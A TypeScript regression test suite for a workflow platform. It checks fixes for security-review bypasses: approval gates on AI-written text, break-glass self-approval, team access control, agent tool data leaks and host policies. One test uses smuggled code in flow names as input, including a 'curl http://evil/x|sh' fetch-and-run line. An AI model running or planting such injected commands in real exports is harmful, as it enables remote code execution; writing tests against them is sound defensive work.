import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { MockProvider } from '../src/ai/provider.js';
import { buildServer } from '../src/api/server.js';
import { createTeam } from '../src/core/teams.js';
import { oneLine } from '../src/export/files.js';
import type { FlowDefinition } from '../src/flows/definition.js';
import { setBreakglass, startGrant } from '../src/governance/breakglass.js';
import { checkModuleApproval, createPolicy, requiredApprovals } from '../src/governance/policies.js';
import { approveExampleModules, giveAllCredentials, makeWorld, releaseFlow, runStatus, type World } from './helpers.js';

// Regression tests for what the security review found: each one was a working bypass before its fix.

const def = (steps: unknown[], props: Record<string, unknown> = {}) => ({ inputs: { type: 'object', properties: props }, steps }) as unknown as FlowDefinition;
const ai = (id: string, input: Record<string, unknown> = {}) => ({ id, type: 'ai', ai: 'organization', instruction: 'x', input, output: 'text' });
const post = (id: string, text: string) => ({ id, type: 'action', module: 'slack@1.0.0', action: 'post_message', input: { channel: 'C', text } });
const auth = (t: string) => ({ authorization: `Bearer ${t}` });

describe('security review', () => {
  const org = new MockProvider();
  let w: World;
  let api: ReturnType<typeof buildServer>;
  beforeAll(async () => {
    w = await makeWorld({}, { ai: org, mcpWaitMs: 0 });
    api = buildServer(w.app);
    await approveExampleModules(w);
    await giveAllCredentials(w, w.alice);
  }, 60_000);
  afterAll(async () => {
    await api.close();
    await w.db.end();
  });

  it('a sign-off step with a condition does not count as review of AI text', async () => {
    const d = def([ai('summary', { t: '{{ inputs.ticket }}' }), { id: 'ok', type: 'approval', when: { isTrue: 'inputs.review' } }, post('notify', '{{ steps.summary.output.text }}')], {
      ticket: { type: 'string' },
      review: { type: 'boolean' },
    });
    const v = await w.app.flows.create('Conditional review', d, w.alice);
    expect((await w.app.flows.review(v.id)).injection.sinks).toEqual(['notify']);
    await w.app.flows.decide(v.id, w.approver, 'approved');
    org.enqueue({ text: 'INJECTED' });
    w.fake.messages.length = 0;
    const runId = await w.app.engine.startRun(v.id, w.alice.id, { ticket: 'x', review: false });
    await w.app.worker.drain();
    expect((await runStatus(w, runId, w.alice)).status).toBe('waiting');
    expect(w.fake.messages).toEqual([]);
  });

  it('a follow-up passing on what an AI wrote makes the next Flow wait for a sign-off', async () => {
    const a = await w.app.flows.create('Summarize', def([ai('summary', { t: '{{ inputs.ticket }}' })], { ticket: { type: 'string' } }), w.alice);
    await w.app.flows.decide(a.id, w.approver, 'approved');
    const b = await w.app.flows.create('Announce', def([post('notify', '{{ inputs.text }}')], { text: { type: 'string' } }), w.alice);
    await w.app.flows.decide(b.id, w.approver, 'approved');
    await w.app.followups.create({ sourceFlowId: a.flowId, targetVersionId: b.id, on: 'succeeded', inputs: { text: '{{ steps.summary.output.text }}' } }, w.alice);
    org.enqueue({ text: 'INJECTED via followup' });
    w.fake.messages.length = 0;
    const src = await w.app.engine.startRun(a.id, w.alice.id, { ticket: 'x' });
    await w.app.worker.drain();
    expect(w.fake.messages).toEqual([]);
    const next = (await w.db.query<{ id: string; status: string }>(`SELECT id, status FROM runs WHERE followup_of = $1`, [src])).rows[0]!;
    expect(next.status).toBe('waiting');
    // A person signs off, then it posts.
    await w.app.engine.decideGate(next.id, 'notify', w.approver, 'approved');
    await w.app.worker.drain();
    expect(w.fake.messages.map((m) => m.text)).toEqual(['INJECTED via followup']);
  });

  it('a break-glass holder cannot sign off the run they started as someone else', async () => {
    const v = await w.app.flows.create('Hotfix', def([{ id: 'ok', type: 'approval' }, post('notify', 'shipped')]), w.alice);
    await w.app.flows.decide(v.id, w.admin, 'approved');
    await setBreakglass(w.db, w.admin, w.approver.id, true);
    const g = await startGrant(w.db, w.approver, { actAs: w.alice.id, reason: 'emergency release now', minutes: 30 });
    const runId = await w.app.engine.startRun(v.id, w.alice.id, {}, { actorId: w.approver.id, breakglassId: g.id });
    await w.app.worker.drain();
    await expect(w.app.engine.decideGate(runId, 'ok', w.approver, 'approved')).rejects.toMatchObject({ code: 'cannot_approve_own_run' });
  });

  it('a run under way stops before a write once its Flow was changed and not approved again', async () => {
    const v = await w.app.flows.create('Old', def([{ id: 'ok', type: 'approval' }, post('notify', 'old version write')]), w.alice);
    await w.app.flows.decide(v.id, w.approver, 'approved');
    const runId = await w.app.engine.startRun(v.id, w.alice.id, {});
    await w.app.worker.drain();
    await w.app.flows.update(v.flowId, def([post('notify', 'new')]), w.alice);
    w.fake.messages.length = 0;
    await w.app.engine.decideGate(runId, 'ok', w.approver, 'approved');
    await w.app.worker.drain();
    const st = await runStatus(w, runId, w.alice);
    expect(st.steps.find((s: { id: string }) => s.id === 'notify')).toMatchObject({ errorType: 'flow_version_not_approved' });
    expect(w.fake.messages).toEqual([]);
  });

  it('flow-version diff, access preview and tag suggestions check the team', async () => {
    const team = await createTeam(w.db, w.admin, 'Secret');
    await w.db.query(`INSERT INTO team_members (team_id, member_id, role) VALUES ($1, $2, 'member')`, [team.id, w.alice.id]);
    const f = await releaseFlow();
    const v = await w.app.flows.create('Secret payroll', f.definition, w.alice, undefined, team.id);
    for (const url of [`/api/flow-versions/${v.id}/diff`, `/api/flow-versions/${v.id}/access`, `/api/marketplace/tag-suggestions?flowVersionId=${v.id}`]) {
      const r = await api.inject({ method: 'GET', url, headers: auth(w.tokens.bob) });
      expect([url, r.statusCode]).toEqual([url, 403]);
    }
    expect((await api.inject({ method: 'GET', url: `/api/flow-versions/${v.id}/access`, headers: auth(w.tokens.alice) })).statusCode).toBe(200);
  });

  it("an agent's flow guide only shows tables of the person's own teams", async () => {
    const token = (await api.inject({ method: 'POST', url: '/api/me/mcp-tokens', headers: auth(w.tokens.alice), payload: { name: 'x', scopes: { tools: {}, drafting: true } } })).json().token;
    const t = await createTeam(w.db, w.admin, 'Finance');
    await w.app.tables.create(w.admin, { teamId: t.id, name: 'salaries', description: 'CONFIDENTIAL payroll', keyColumn: 'employee', columns: [{ name: 'salary', type: 'number' }] });
    const r = await api.inject({
      method: 'POST',
      url: '/mcp',
      headers: { ...auth(token), 'content-type': 'application/json' },
      payload: { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'get_flow_guide', arguments: { teamId: t.id } } },
    });
    const result = r.json().result;
    expect(result.isError).toBe(true);
    expect(JSON.stringify(result)).not.toContain('salaries');
  });

  it('names are one line, so they cannot turn into code in exported apps', async () => {
    await expect(w.app.flows.create("Desk\nprocess.exit(1);//", def([post('notify', 'x')]), w.alice)).rejects.toMatchObject({ code: 'invalid_name' });
    expect(oneLine('Desk\nRUN curl http://evil/x|sh #')).toBe('Desk RUN curl http://evil/x|sh #');
  });

  // Last: these rules apply to the whole organization.
  it('policies: host settings stay inside allowed hosts; table, app and Flow steps count as writes', async () => {
    await createPolicy(w.db, w.admin, { kind: 'allowed_hosts', config: { patterns: ['*.atlassian.net', 'slack.com'] } });
    const manifest = (pattern: string) =>
      ({ name: 'site', hosts: ['{{settings.site}}'], settings: [{ id: 'site', type: 'host', label: 'Site', pattern, default: 'a.example' }], credentials: [], actions: [] }) as never;
    await expect(checkModuleApproval(w.db, manifest('*.ngrok.io'))).rejects.toMatchObject({ code: 'policy_violation' });
    await expect(checkModuleApproval(w.db, manifest('*.atlassian.net'))).resolves.toBeUndefined();
    await createPolicy(w.db, w.admin, { kind: 'approvals_for_writes', config: { count: 2 } });
    const need = await requiredApprovals(w.db, def([{ id: 't', type: 'table', table: 'x', op: 'delete', key: '1' }]), new Map());
    expect(need.count).toBe(2);
  });
});
